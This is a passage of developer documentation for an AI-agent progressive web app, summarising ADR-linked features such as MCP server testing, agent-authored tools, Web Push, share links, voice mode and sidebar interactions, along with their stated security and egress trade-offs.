  server, the user is told **in the UI, immediately** whether it was reachable and how many tools it exposes,
  instead of finding out indirectly on some later chat. `POST /api/mcp-servers/{id}/test` connects to one
  named server, lists its tools, records the names, **invalidates that user's cached tool set (ADR 0069)**
  and disconnects — reached from a **Test** button in the
  edit dialog, run **automatically after a successful save**, and again **on the OAuth return** (whose success
  redirect now carries `serverId`). **The auto-test has two carve-outs, both load-bearing:** a *disabled* server
  is never dialled (egress, below), and neither is an *InteractiveOAuth server with no stored token* — Save
  cannot perform the sign-in, so the probe could only ever say `not connected (no OAuth token yet)`, an accurate
  message rendered as a failure at the one moment the user cannot act on it (the dialog is `showModal()`, so the
  list row's Connect glyph is inert beneath it). That shipped in 0064 and was reported as a bug; the dialog now
  carries its own **Connect** button sharing one `startMcpOAuth()` with the row. **The amendment to 0024 is narrow and worth stating exactly:** the
  management endpoints were pure config CRUD that never opened a socket, and one of them now does, on explicit
  request. **ADR 0058's `GET /api/tools` rule is NOT weakened** — that rule was never "never connect", it was
  "never connect *on a page load, for every server, implicitly*", and both of its measured objections (~10 s
  per dead server sequentially; an OAuth refresh turning a GET into a **write**) evaporate on a user-pressed
  POST against one server. It **closes 0058's cold start** as a side effect: a successful test records the
  names, so the per-tool checkboxes appear without waiting for a chat activation (measured in DevHost — a
  tested server yields `mcp:{id}` + one key per tool, an untested control only `mcp:{id}`). New
  `McpOAuthTokenResolver` (lifted out of `UserMcpToolProvider`, which now delegates) and `McpConnectionTester`;
  no new folder, no new `AgentApi.*` partial, **no `excludedPaths` entry** (a new `EasyAuthExclusionTests` row
  proves it), no Bicep, no secret, no Cosmos container, and **no new egress for an ENABLED server** (it dials
  the same server with the same credentials the chat path already uses — changing *when*, not *whether*).
  **The disabled server is the exception and the reason one line is load-bearing:** the chat path connects
  only to enabled servers (`Where(s => s.Enabled)`), so a disabled server's credentials have never reached its
  endpoint; pressing Test now sends them (accepted — that is what the button is for), but **the auto-test on
  save is gated on the Enabled checkbox** so a *save* never does, which would otherwise be egress the user
  never asked for. Status codes are **503** unconfigured · **404**
  unknown-or-foreign id · **200 with `ok:false`** for a reachable-but-failing test (the config-health
  convention: the request succeeded, the diagnosis is the payload). Four traps, all in gotchas: the resolver
  is **shared, not re-implemented** (a probe skipping the near-expiry refresh would report failure on a server
  chat connects to fine — the worst defect a diagnostic tool can ship; the accepted cost is that Test on a
  near-expiry OAuth server bumps the overlay version and invalidates that user's warm socket cache); a test is
  **not an activation**, so it disposes in a `finally` and never touches `IUserMcpToolProvider` (guarded
  **structurally**, by reflection over the ctor); failure reasons are **curated, never the exception**; and —
  the one that would have shipped a real bug — **never record an empty tool list**, because
  `RecordToolNamesAsync` no-ops when the list is *unchanged*, not when it is *empty*, so `[]` **erases** the
  names and makes ADR 0058's unreachable state reachable (a server reading OFF while still granting a tool).
  `UserMcpToolProvider` has the **identical hole** on its own path, deliberately left for its own MR. Two
  client rules have **no runtime test** and are guarded by source text — the **duplicate-create defence**
  (`POST` always inserts and the dialog now stays open, so it must adopt the response id or a second Save
  silently creates a duplicate) and the **unconditional save-path `refreshToolCatalog()`** (a save whose
  auto-test fails must still update the pickers) — and **both were mutation-checked**. DevHost registers an
  **offline fake `IMcpConnectionFactory`** so the feature is exercisable offline at all; it proves the wiring,
  not an MCP handshake. Shell cache bumped `agent42-shell-v27` → `-v28`. The DevHost browser leg **was** run
  (headless Chrome over CDP, 13/13) and ADR 0064 records the measured values.
- Agents author their own tools — ToolForge (ADR 0070, **extends 0024/0026/0058**): a dedicated **Tool
  Builder** agent writes a Python tool, runs it, reads the traceback, fixes it and publishes it; every other
  agent of that user can then call it. **No Agent42 product code** — the build lives in the sibling repo
  `Expecho/mcpserver` as ToolForge.Core + ToolForge.Mcp behind the existing Mcp.Gateway, and on this side it
  is two ADR 0024 MCP server entries plus two stored agents. **Two surfaces, and the split IS the privilege
  boundary:** an *authoring* server carrying exactly `write_tool`/`run_tool`/`list_tools`/`delete_tool`, given
  only to the builder via `AgentDefinition [Id(8)] EnabledTools`, and a *runtime* server carrying **only**
  promoted tools and no authoring tool at all. Two host names → two ports (8080/8081) → one process → one
  registry; routing both names at one address destroys the separation silently while every test passes.
  **The headline consequence is the largest in the app: there is no sandbox** (a deliberate reversal of the
  design note's execution gate, user-accepted), so generated code runs with full network and filesystem, and
  the **gateway API key is the only thing between the public internet and arbitrary code execution on the
  operator's hardware**. It gets its own container purely so that code cannot read the gateway's
  `MCP_API_KEY`/Google OAuth secret out of the process environment — that is *not* a sandbox. **The trap that
  reaches back into THIS repo:** `BuildAgent` merges MCP tools into the same flat list as static tools with
  **no name de-duplication**, and `ToolCatalog` keeps an unmapped dynamic name **unconditionally**, so nothing
  here filters a collision — the forge's write-time **reserved-name list** is the only defence, and **a tool
  added to Agent42 later must be added to that list in the sibling repo** or a written tool can shadow it.
  The 8 KB `McpToolLimits.MaxToolResultLength` budget, the "return, do not print" contract and the reserved
  names all live in the **tool descriptions** (ADR 0067's lesson — the JSON schema is what the model reads).
  Promotion is **one** action since ADR 0069 (Test invalidates the cache *and* records names), which
  **corrects design-note C1** — but its zero-tool carve-out means a runtime surface with nothing written yet
  invalidates nothing. Measured server-side end to end (fix loop, third-party install 5.5 s → 0.72 s reused,
  128 tests green); **M1–M5, the Agent42-side cache questions, were NOT run** and are recorded as open in the
  design note's `## Measurements` — including whether a *warm* consumer chat ever picks up a new tool.
- Web Push when an agent replies while away (ADR 0028): a **Web Push** notification titled with the
  **agent's name** is delivered to the user's installed Android/Chromium PWA when an agent finishes a reply
  on one of the two **asynchronous** paths — a fired reminder (`ReceiveReminder`) or an agent-run
  (`EnqueuePromptAsync`, ADR 0022). "Not online" is approximated by **one fact — we send only on those two
  async paths, never from `ChatCoreAsync`** (the live stream the user is already watching); a server-side
  presence/heartbeat was considered and **rejected**. The send lives in the two async **callers** — inside
  `EnqueuePromptAsync`'s `try` after the drain (gated on `_modelId` so the no-model notice path doesn't fire
  a false push) and after `ReceiveReminder`'s `WriteStateAsync` — and the SW **always shows** the
  notification on a received push (**no** suppress-if-focused: that violates Chromium's `userVisibleOnly`
  budget contract and risks subscription revocation). Subscriptions live in a **dedicated per-user grain**
  (`IUserPushGrain`, state `"push-subs"` on `agent-state` — **no new container**, not `UserProfile` which
  ADR 0005 keeps scalar), stored **cleartext** (a device push capability usable only against our VAPID pair,
  not a third-party credential — encryption deferred). The interface/impl split follows `IGeocoder`:
  `IPushNotificationSender`/`PushMessage`/`NullPushNotificationSender` in Agents, `WebPushNotificationSender`
  (over the `WebPush` package, isolated behind an `IWebPushClient` seam) in Backend. **Every AgentGrain host
  must register `IPushNotificationSender`** (else activation fails) and **every host that maps `MapAgentApi`
  must register the `PushConfig` singleton** (a route-matcher dependency, like `IMcpSecretProtector`). The
  **VAPID private key is the only secret and is OPTIONAL** (the `contextApiKey`/`googleMapsApiKey` shape, not
  `searxngSecret`: no key → app boots, `GET /api/push/config` returns `enabled:false`, UI hides the toggle) —
  a `VAPID_PRIVATE_KEY` GitHub secret → `Push__VapidPrivateKey`; the public key + `mailto:` subject are
  **non-secret and committed** in `appsettings.json`. Three things to read before touching this: the send
  belongs in the two async callers, never `ChatCoreAsync` (the ADR 0028 gotcha); the sender bounds a
  `SendBudget` timeout and calls `RemoveAllResilienceHandlers()` because `AgentGrain` is non-reentrant; and
  the sender POSTs to the browser-supplied subscription endpoint — an **accepted blind-SSRF property** of
  Web Push (authenticated, encrypted body, no response returned), deliberately **not** host-guarded.
  **Headline consequence:** the notification transits a third-party push service (FCM/Mozilla/WNS), but the
  payload is **RFC 8291 end-to-end encrypted** — a materially smaller egress than ADR 0013's, though the
  title is the user-chosen agent name. Android/Chromium only; iOS-in-browser is feature-detected out.
- Configuration health tab (ADR 0029): a read-only **Preferences → Configuration** tab, backed by
  `GET /api/config-health`, that reports which config inputs are present/malformed/(opt-in) unreachable — so a
  silently degraded feature (geocoding off, context.dev 401, Web Push off) is visible instead of mysterious.
  **The load-bearing invariant: the report never contains a secret value** — only a status
  (`ok`/`warning`/`error`/`skipped`/`na`) + a **curated** message per check, the same `Mask`/`hasKey`/
  `PushConfig.Enabled` discipline. `ConfigHealth.BuildStatic` is a **pure function** of `IConfiguration` +
  `IHostEnvironment` + `PushConfig` (no HTTP, no DI); live probes are a separate **opt-in** `ProbeAsync` path
  (a "Run live checks" button — a geocoding/context.dev probe is **billable**), so a static call runs **zero**
  probes. Behind Easy Auth like every `/api/*` read (never `excludedPaths`); all allowlisted users may view
  (no role system). Four things to read before touching this: **the PROBE path is the real leak channel, not
  the static one** — the geocoding key rides in the request query string (`GoogleGeocoder`), so `ProbeAsync`'s
  catch **discards the exception** and every probe returns a curated constant, never `ex`/a body/a target URL;
  the endpoint injects **`IServiceProvider`, deliberately NOT `IHttpClientFactory`** (unregistered in DevHost —
  a minimal-API param it can't resolve breaks routing for the whole host) and resolves probe deps optionally,
  adding **no new mandatory both-hosts registration**; the **geocoding probe is built only when its key is
  present** (else `CreateClient` returns a retry-pipeline-inheriting client — the named-client trap) while
  embeddings use `IEmbeddingGenerator` (no named client) and SearXNG/context.dev are unconditional; and a
  **SearXNG 403 is a HEALTHY sidecar** (JSON API off), not an auth failure. The tab is **appended LAST** in the
  Preferences tablist — the MCP-OAuth return deep-links to `profileTabs.select(3)`, so Configuration is index 4
  and MCP stays 3.
- Token-usage dashboard (ADR 0031): a **dedicated full-page usage view** (opened from the sidebar footer,
  a fixed overlay — not a Preferences tab) that reproduces the sibling `AI.Telemetry.Dashboard` — headline
  tiles + tokens-by-model + tool-calls-by-name + usage-by-user tables, with 24h/7d/30d/all filters +
  auto-refresh, in Agent42's own amber/phosphor style. It is **GLOBAL / cross-user** (any signed-in user sees
  aggregate spend incl. other users' email/usage — accepted for the ~2 allowlisted users, behind Easy Auth,
  no role system) via `GET /api/usage` (+ `/usage/applications`, `/usage/users`). Data is fed **solely from
  the OpenTelemetry gen_ai spans already emitted** (no manual counter in `AgentGrain`): a Backend
  `UsageSpanProcessor` (`OnEnd`, non-blocking, bounded drop-on-full channel) projects finished spans and a
  `UsageIngestionService` (≥30 s flush, Backend-only) batches them into a **single global `UsageRollupGrain`**
  (well-known key `"global"`) riding `agent-state` on a `"usage-rollups"` state — **no new Cosmos container**,
  the `UserPushGrain` pattern. Read the "usage dashboard counts tokens from `chat` spans ONLY" gotcha before
  touching this: the projector must whitelist `chat`/`execute_tool` and drop `orchestrate_tools` (its usage is
  the SUM of child chats — double-count); cached/reasoning tokens are always 0 (OTel emits neither — the
  dashboard measures chat spend, **not** embedding spend); async paths land in an **unreported** user bucket;
  the **`application` dimension is per-agent** (the grain publishes the agent name into `RequestContext`, the
  identity span processor stamps it as the `agent42.application` tag — never override `gen_ai.operation.name`;
  non-agent chats fall back to `"Agent42"`); and the global grain **prunes on every write** (hourly ~48 h / daily ~92 d) to hold the 2 MB item cap
  (ADR 0004), so `range=all` = the retained window. Empty offline — because the usage processor is
  Backend-only, **not** because DevHost lacks a pipeline: since ADR 0054 it has one.
- Offline read cache (ADR 0032): the installed PWA renders the user's **agents and chats offline** via a
  **client-side IndexedDB mirror in `cache.js`** (DB `agent42-cache`, store `kv`, keys `agents` /
  `conversations` / `messages:<id>`; helpers `cacheGet`/`cachePut`/`cacheDelete`). Every successful
  `/api/agents` · `/api/conversations` · `.../messages` fetch writes the mirror; `hydrateFromCache()`
  paints cached lists at startup (length-guarded so the network fast-path wins) and the loaders fall back
  to the cache on failure — a chat is viewable offline only if it was opened at least once online
  (`selectConversation` caches its history and replays it through the extracted `renderTurns`). **The SW
  is deliberately NOT involved** — it stays shell-only and never touches `/api` (ADR 0002); "fixing" empty
  offline lists by caching `/api` in the SW breaks that invariant (see the gotcha). Only infra-free change
  beyond the frontend JS is the shell version bump `agent42-shell-v9` → `-v10`. **Consequence:** conversation text
  + agent definitions now persist **unencrypted** in origin IndexedDB (data-at-rest, cleared with site
  data); no new egress. Image thumbnails don't load offline (separate attachment proxy) — text shows.
- Ephemeral / incognito chat (ADR 0034, **UI position amended by ADR 0044**): an **incognito toggle** —
  in the persistent topbar cluster since 0044, not the composer frame — starts a chat whose history is
  **never persisted** (the grain skips its `WriteStateAsync`) and that **never appears in the sidebar** (the
  `POST /api/chat/{id}` handler skips `ConversationIndexGrain.TouchAsync`). It reuses the non-persisted
  `_turnLocation` pattern exactly: a trailing `bool Ephemeral` on `ChatRequest` → a trailing `bool ephemeral`
  on `IAgentGrain.ChatAsync` → a turn-scoped **`_ephemeral`** field cleared in `ChatAsync`'s `finally` (and
  reset on the two always-persisting async entrypoints). **Scope is session-only:** documents are **blocked
  at the composer** (RAG ingestion writes durable Cosmos vector chunks), images stay allowed (their blob
  bytes persist — accepted), and **scheduling is refused inside `SchedulePromptAsync`** (a durable reminder
  would fire the persisting/pushing `ReceiveReminder`, ADR 0028). The toggle is fixed at chat creation
  (settable only on a fresh empty regular chat, hidden under the picker lock on agent chats) — those rules
  survived 0044's move untouched; only its DOM position and the engaged tint's target changed. No new grain,
  no state migration, no new Cosmos surface. **The guarantee is "not persisted, not listed", not "not in
  memory"** — a live activation still holds the chat; the trace-free property shows up on deactivation. Egress
  (ADR 0013) is unchanged: incognito is about durability, not privacy from a third-party model. See the
  ephemeral-chat gotcha before touching `_ephemeral` or the scheduling guard.
- Read-only share links (ADR 0035, **owner UI extended by ADR 0044, outbound share added by ADR 0047**): an owner mints a **public, no-login**
  link to any conversation (regular or agent chat) from a share action on each sidebar row (`buildConvRow`)
  **or from `#topbarShareBtn` in the persistent topbar cluster** — both open the same `#shareLinkDialog`
  (create / share-or-copy / revoke — **Copy is conditional as of ADR 0047**), and both only *open* it:
  nothing is minted until the user presses **Create**. It mirrors the ADR 0022 two-grain split: **`ShareToken`** (copy of `ApiKey`, `shr_`
  prefix) → a global hash-keyed **`ShareLinkDirectoryGrain`** (token hash → `(userId, conversationId)`) for
  O(1) public resolution, plus a per-user **`UserShareLinksGrain`** (state `"share-links"`) for
  list/create/revoke — both ride `agent-state`, **no new Cosmos container/secret/DI**. Owner routes
  `POST/GET/DELETE /api/conversations/{id}/share` (Easy Auth); public routes `GET /api/share/{token}` and
  `/api/share/{token}/attachments/{attachmentId}` are on **`excludedPaths`** (with the self-contained static
  viewer under `wwwroot/shared/`), **self-enforce** the token, take userId+conversation
  from the directory (**never `GetUserId`**), and **fail closed → 404**. **The four entries are
  `/api/agent-run`, `/api/share/*`, `/shared`, `/shared/*` — corrected by ADR 0042, which is required
  reading before editing that list:** `excludedPaths` matches a path **exactly** unless the entry ends in
  `/*`, so the bare `/api/share` + `/shared` this feature originally shipped gated every URL a recipient
  loads and made it **non-functional in production**; `EasyAuthExclusionTests` now pins the measured
  semantics against the Bicep. ADR 0042 also adds `UseForwardedHeaders(XForwardedProto)` as the **first**
  middleware in `Program.cs` — without it `Request.Scheme` is `http` behind the ACA ingress, so `ShareUrl`
  (and the ADR 0025 MCP OAuth `redirect_uri`, whose persisted `ClientId` does **not** self-heal) minted
  `http://` URLs. **Two deliberate inversions of ADR
  0022** (see the share-link gotcha): the **raw** token is stored (owner re-copies it repeatedly; low
  sensitivity), and revoke **deregisters the directory FIRST** (unsharing has no conversation-deletion
  backstop, so fail-toward-dead). **Headline consequence (extends ADR 0013):** a token exposes the
  conversation's **full current live history** — text, images, the user's street address (ADR 0012),
  document/web content — to anyone holding the link, outside the Entra tenant; the view is live until revoked,
  and **revocation is the only control** (deleting the conversation also revokes it).
- Native share for a read-only link (ADR 0047, **extends 0035 + 0013**): pressing **Create link** in
  `#shareLinkDialog` now mints, renders, **and then** hands the fresh URL to the OS share sheet via
  `navigator.share`, and a **Share** button **replaces** (not joins) **Copy** wherever that API exists.
  Frontend-only — no endpoint, grain, token shape, `excludedPaths` entry, secret or Bicep change; both
  buttons ship in the markup with Share `hidden` and `wireShareLinks` flips the pair. **The gate is a
  pure feature-detect** — `typeof navigator.share === "function"`, the `speech.js` import-time-capability
  idiom — which is emphatically **not an Android test**: desktop Chrome/Edge on Windows, Safari and
  Firefox-on-Android all match, so Copy disappears there too and the ungated auto-open force-opens an OS
  flyout on desktop. Both were chosen with that stated (`(hover: none)` gating and UA sniffing were
  rejected); `#shareLinkUrl` stays a selectable readonly input as the desktop fallback, and
  `NativeShare_IsGatedOnAPureFeatureDetect` pins the exact expression so the choice stays falsifiable.
  **The ordering is load-bearing:** transient user activation is a Window-scoped ~5 s window that
  `share()` consumes — the risk is it **expiring** across the POST `await` (and WebKit's same-task rule),
  never "the fetch spending it" — so the link is rendered first and a sheet that never opens is a
  non-event. Both rejections (`AbortError` = dismissed, `NotAllowedError` = no activation) are swallowed
  silently. Payload is **title + url only** (a `text` repeating the URL renders twice in some targets),
  the title captured **raw** because `shareLinkConvTitle.textContent` is quote-wrapped. **Headline
  consequence:** the conversation **title** now leaves the app alongside the URL — Copy carried the URL
  alone — and the OS share history sees it (a **first-turn** chat sends the placeholder
  `This conversation`, because the server derives the real title only after that turn); ADR 0035's consent property is untouched (nothing minted
  without the Create press). Shell cache bumped `agent42-shell-v18` → `-v19`. The three browser passes
  **were** run (headless Chrome over CDP against DevHost, stubbed/deleted/rejecting); the real Android
  system sheet on a device stays an honest unverified residual. Read the `navigator.share` gotcha before
  touching `createShareLink`.
- Follow-up suggestion prompts (ADR 0036): after an **interactive** reply, `AgentGrain` makes one extra
  model call (`GenerateFollowUpsAsync`) — **streamed via `GetStreamingResponseAsync` and aggregated, the same
  path/cached client the reply uses** (the non-streaming `GetResponseAsync` returned nothing on the Foundry
  Responses adapter, ADR 0014) — to produce up to 3 short
  follow-up prompts, streamed as a new **`AgentStreamEventType.Suggestions`** event (`[Id(11)]`) before
  `Done`; the browser renders them as chips that **send on click**. Gated to the live path by a turn-scoped
  `_interactiveTurn` flag (OFF on the agent-run/reminder drains of the same `ChatCoreAsync` — no wasted call),
  **best-effort** (its `try/catch` returns null on failure; the reply/`Done` are never affected) and
  **session-free** (a throwaway message list, never `_session`, no state write). Controlled by a **default-ON
  Preferences toggle** — `UserProfile.SuggestFollowUps` is a **null-sentinel `bool?`** (`null`/`true` = ON,
  `false` = OFF; legacy state stays ON, zero migration), read once on activation into
  `_suggestFollowUpsEnabled` and settable via `PUT /api/profile`. **Headline consequence:** it spends an extra
  small model call and re-sends recent conversation text to the model per interactive turn (ADR 0013 egress) —
  which is why it is opt-out. Chips are live-only (not replayed by `renderTurns`; cleared on the next `send`).
- Hands-free voice conversation (ADR 0037, **extends ADR 0006**): a dedicated composer `#voiceBtn` (distinct
  from `#micBtn` dictation) starts a **hands-free loop** — auto-listen → auto-send → **speak the reply** →
  **talk over it to interrupt** → re-listen — with **no buttons between turns**. Browser-native and
  **frontend-only** (all in `src/Agent42.Backend/wwwroot/js/` + `index.html` + `styles.css`; no endpoint/grain/Bicep/Azure/JS
  dependency, exactly like ADR 0006): `SpeechRecognition` to listen + **`speechSynthesis` to speak** (the new
  output half — ADR 0006 was input-only). A **dedicated second `SpeechRecognition` instance** drives voice mode
  so the dictation instance's Android accumulation fixes stay untouched; the two mic uses are mutually exclusive
  (`startVoice()` calls `stopSpeech()`). A controller runs a state machine `idle → listening → thinking →
  speaking → listening`: recognition runs continuously (restarted on Chrome's silence `end`), a **~1.2 s silence
  debounce** ends the utterance and auto-sends, and the reply is spoken **sentence-by-sentence as it streams**
  (fed from `send()`'s `textDelta` chunks, markdown-stripped) so speech starts early; the last utterance's `end`
  re-arms listening. **Barge-in** keeps the mic **live while speaking** — a genuine result cancels TTS and
  **aborts generation mid-stream** via a new `AbortController` on `send()`'s `fetch` (`sendAbort`); an
  `AbortError` is a clean interruption, **not** a "Transmission failed" (the `catch` special-cases it). The
  button is hidden unless **both** speech APIs exist (Firefox/older iOS degrade out), mirroring ADR 0006. Two
  things to know: **egress (ADR 0013) is unchanged** — TTS output never leaves the browser, and recognition
  reuses ADR 0006's already-accepted vendor-cloud residual (no new one); and the **assistant-hears-itself echo**
  is an **accepted residual** — mitigated by a best-effort word-overlap heuristic (`isSelfOrEcho`, ≥ 0.6) but
  **headphones are the clean guarantee**. No runtime test (speech APIs can't run headlessly) —
  `VoiceConversationAssetsTests` guards the wiring by source-text, behaviour verified manually in DevHost.
- Server-side voice / speech model (ADR 0038, **amends ADR 0006/0037, extends 0013/0018/0020/0030**): when a
  user picks a **default speech model** in Preferences, the hands-free voice reply (ADR 0037) is spoken by an
  Azure/OpenAI **text-to-speech** model instead of the browser's `speechSynthesis`; with none set (or on any
  failure) it **falls back to the browser voice**. Scope is **assistant voice (TTS) only** — the user still
  speaks through the browser recognizer. It **mirrors the per-user embedding model (ADR 0030) almost exactly**:
  a per-model **`SupportsSpeech`** flag threaded through the five model representations
  (`StoredModel [Id(6)]`/`ConfiguredModel`/`ModelInfo`/DTOs/resolver) that **only filters the picker** —
  deliberately **NOT** on `ModelCapabilities` (like embeddings; sidesteps the Foundry `GetCapabilities→Full`
  shortcut) — plus a **`UserProviderConfig.SpeechDefault [Id(4)]`** set via **`PUT /api/default-speech-model`**
  (read on `GET /api/providers`), validated once by the resolver's **`EffectiveSpeechDefault`** →
  `ResolvedProviderSet.SpeechDefaultModelId` (no baseline/first-model fallback). The service seam is
  **`ISpeechService.SynthesizeAsync` → `IChatClientFactory.GetSpeechService()`/`DefaultSpeechModelId`** (the
  `GetEmbeddingGenerator()` shape); prod **`OpenAISpeechService`** wraps the SDK **`AudioClient`**
  (`GenerateSpeechAsync`, voice `Alloy`, MP3), built off the **same** provider client as chat — Foundry over
  **`/openai/v1` + `api-key` header** (NOT the api-version data plane the embedding client uses, which caps at
  2024-10-21), never a named `HttpClient`, endpoint from config only. **`POST /api/speech`** (text→audio)
  resolves the factory **optionally via `IServiceProvider`** (the `/api/config-health` pattern — no new
  mandatory both-hosts registration) and **409s when unconfigured**. The voice controller plays `/api/speech`
  audio through an **ordered queue** (fetches pipeline, playback sequential) with a dedicated **`speechAbort`**
  for barge-in; **`ISpeechService` is named to dodge M.E.AI's `ISpeechToTextClient`** (the `IImageGenerationService`
  CS0104 trap). **Headline consequence:** picking a speech model sends the **reply text** outside the tenant
  (ADR 0013 egress) — the reason it is opt-in and the browser voice stays default. Offline can't reach a real
  TTS endpoint (like image gen, ADR 0020); the Foundry audio wire path is spike-informed, prod-smoke verified.
- Frontend is deliberately vanilla JS in `src/Agent42.Backend/wwwroot/` (no SPA build).
- Preferences is a rail with a mobile drill-down (ADR 0065, **amends 0021**): `#profileDialog` was a
  `min(520px, 92vw)` box whose six sections were a **single non-wrapping flex row** with no wrap and no
  scroller — measured on `main` at 390px, the tablist was `scrollWidth 525 / clientWidth 313` with Skills'
  right edge at **636px**, so half the sections were unreachable on the installed Android PWA. It is now
  header / rail / scrolling pane / footer, and at ≤760px the *same markup* becomes a two-level drill-down
  (`.prefs.is-detail`). **The rail is a RESTYLE of the same `role="tab"` buttons, not a new nav**: `wireTabs`,
  the ids and the `profileTabs` pairing are untouched because `src/Agent42.Backend/wwwroot/js/mcp.js`
  deep-links `profileTabs.select(3)` and two tests parse that array — so "MCP is index 3" now also reads as
  **"MCP is the 4th rail item"**. Frontend-only apart from one display field: `ToolDescriptor` gains a
  trailing `string? Description` (a **response DTO only — never grain state**, so no `[Id]`, no migration, and
  the three call sites in `src/Agent42.Backend/Tools/AgentApi.Tools.cs` use named args and compile untouched),
  giving each built-in a description line; **skill and MCP rows pass null and render label-only** — their
  labels are user- and server-supplied names. Copy comes from the ADRs, **not the mockup, which shows a
  Calendar tool ADR 0063 deleted**; the `location` and `memory` lines deliberately name the egress.
  **Switches replace checkboxes in all THREE containers** (`profileToolChecks`, `agentToolChecks`,
  `chatToolChecks` — one `renderToolChecks`, one look), so the agent editor and composer popover change
  visually: intended scope, not a leak. Group cards come from a **closed-over `currentGroup`**, never a
  threaded parameter, because `SkillPickerAssetsTests` pins `addGroup("Skills", skills)`,
  `addHeading("MCP servers")` and the `addServer(server)` loop as literal source text. Three traps, two in
  gotchas: the drill-down must **not** be driven from `wireTabs`' `select` (`openProfileDialog` calls
  `select(0)` on every open, so a phone would always land in General's detail view) — it is a delegated rail
  click using `closest`, since the inline SVG icons make `e.target` a `<path>`; the prefs CSS is **split
  across two places in `styles.css`** (`.prefs` must follow `.agent-dialog` on a specificity tie, while its
  media block must not be the *first* 760px block — and both guards are a plain `IndexOf` that **does not
  skip comments**, so the pointer comments must not quote the at-rule or a selector-plus-brace); and every
  nav rule is written `.prefs .agent-form__tab…` because `#agentDialog` shares that family and **nothing in
  `tests/` asserted it**, so an unscoped edit would mangle the agent editor with the suite green (AC12 now
  guards all five family members structurally, parsing selector lists on **brace** boundaries — a
  lines-ending-in-`{` filter misses a single-line rule, which is a live idiom here). A fourth, new coupling:
  `enterPrefsDetail` resolves its tab by **DOM order** while everything else uses the **`dom.js` array**
  order, so `RailMarkupOrder_MatchesTheProfileTabsArrayOrder` pins the two together.
  `#prefsStatus` is wired to the **four Save-persisted fields only** — the three
  model selects and all provider/MCP/skill CRUD persist immediately, so a form-level listener would claim
  "Unsaved changes" for something already stored — and it can only ever show two of its three states, since
  `saveProfile()` closes the dialog. Shell cache bumped `agent42-shell-v30` → `-v31`. The DevHost browser leg
  **was** run (headless Chrome over CDP, both themes, both widths) and ADR 0065 records the measured values —
  including one residual it does not own: the document already overflows to **534px** at a 390px viewport on
  `main` (`.composer__hint` and its `<kbd>`s, the gap ADR 0043 records), which offsets the centred modal.
- Pinned conversations (ADR 0045): a pin toggle on every sidebar row hoists a chat to the top of the
  transmissions list and keeps it there regardless of recency. It is a trailing optional
  **`[Id(5)] bool Pinned = false`** on `ConversationInfo` (the `[Id(3)]`/`[Id(4)]` agent-identity shape —
  zero migration), a `SetPinnedAsync` on `IConversationIndexGrain`, `GetConversationsAsync` ordering
  **`OrderByDescending(Pinned).ThenByDescending(UpdatedAt)`**, and **`PUT /api/conversations/{id}/pin`**
  (Easy-Auth gated — **not** `excludedPaths`; idempotent; a silent no-op for an unlisted id). `TouchAsync`
  is **untouched** — its `with` expression carries `Pinned` forward for free, which is exactly why a
  regression test pins that. **The load-bearing part is client-side and must not be got wrong:**
  `renderSidebar` does one walk that places an agent group at its most-recent member, so server-side
  re-sorting **alone** would drag an agent's *entire group* to the top when one of its chats is pinned.
  The render is therefore **two passes** — a flat pinned block (`buildConvRow(conv, true)`), then the
  existing grouping walk over the **unpinned remainder only** — which costs the hoisted row its agent
  label (only `.conv-group__name` draws it) and is repaid by a `.conv__agent` badge; a **fully-pinned
  agent group disappears by design**, the normal case for a continuous agent (ADR 0016), safe only
  because of that badge. Persistence is proved on the **Cosmos JSON path** (a committed pre-pin
  `ConversationIndexState` golden document in `GrainStorageSerializerTests` — Newtonsoft binding a
  *missing* property onto a positional record is the actual risk); the binary
  `SerializationCompatibilityTests` assertion is secondary and explicitly **not** the data-at-rest guard.
  An `@media (hover: none)` block originally revealed `.conv__pin`/`.conv__share`/`.conv__delete`
  **permanently** — without which pinning is impossible on the Android PWA while unpinning works — which
  also fixed the same pre-existing gap on share and delete, but **only for those three**:
  `.agent__action` and `.msg__copy` use the same hover-reveal idiom and stay touch-unreachable (a recorded
  residual, not fixed here). **ADR 0052 replaced that permanent reveal with a long press** (the three
  actions are hidden and inert until a hold reveals one row); `.conv-row.is-pinned .conv__pin` is the one
  rule it deliberately left alone. Ephemeral chats (ADR 0034) are structurally unpinnable (never
  indexed); pins are **not** surfaced into the ADR 0035 public share payload; offline lists cached before
  this shipped render unpinned until the next refresh. Shell cache bumped `agent42-shell-v15` → `-v16`.
  Read the hoist-out-of-the-group gotcha before touching `renderSidebar`.
- Long press reveals a row's actions on touch (ADR 0052, **amends 0045**): the pin/share/delete glyphs no
  longer sit lit on every sidebar row of the installed PWA. They are hidden and **inert** until a **~400 ms
  press-and-hold** marks one row `.is-revealed` (`wireRowReveal` in `src/Agent42.Backend/wwwroot/js/sidebar.js` — the repo's
  **first** pointer-event handler). Frontend-only: no endpoint, grain, secret or Bicep change.
  **Two things make it harder than an opacity swap, and both were caught in review, not testing.** First,
  **`(hover: none)` UAs still match `:hover`** — Android Chrome applies it on tap and press-and-hold and
  keeps it until you tap elsewhere — so the three `.conv-row:hover .conv__*` rules had to move into
  **`@media (hover: hover)`**, split from their `:focus-visible` partners, which stay **ungated** for
  keyboard. Without that the gesture is decorative and a plain tap still lights every row. Second,
  **`opacity: 0` removes the paint, not the hit-test**: the actions overlay the 82 px strip `.conv`'s
  padding reserves, so hidden-but-live meant a thumb on any row's right edge firing
  `deleteConversation`'s `confirm()` from an invisible control — hence **`pointer-events: none`** when
  unrevealed, with `.conv-row.is-pinned .conv__pin` exempted back to `auto` (it is *visible*, so it must
  stay pressable). Three traps in the JS: `pointercancel` must cancel only a **pending** timer (Android
  fires it for its own long-press at ~500 ms, *after* our 400 ms); the click-suppression listener sits on
  the **row button, not the `<li>`** (the actions are the `<li>`'s children and their `stopPropagation`
  runs later, in the bubble phase); and **never add `touch-action` to `.conv-row`** — it would stop the
  list scrolling. `renderSidebar` calls `clearReveal()` first, since it rebuilds every row.
  **Consequences:** the gesture is **undiscoverable** (accepted cost of a quiet list); `user-select: none`
  costs long-press-to-copy on titles; and a reveal does not survive the action taken from it. Shell cache
  bumped `agent42-shell-v21` → `-v22`. The manual pass **was** run (headless Chrome over CDP) and ADR 0052
  records the measured values — including one addition to ADR 0045's lever note: the viewport must be
  **wider than 760 px**, or the sidebar is an off-canvas drawer and every synthetic touch misses, which
  looks exactly like a broken feature.
- Recovering a reply whose stream died (ADR 0046): switching away from the installed PWA mid-reply used
  to end in **"Transmission failed."** while a refresh showed the complete answer. **The turn was never
  lost — only its delivery was**, and the fix is **client-side only, no server change**: on a non-abort
  stream failure `send()` re-reads `GET /api/conversations/{id}/messages` and adopts the persisted reply
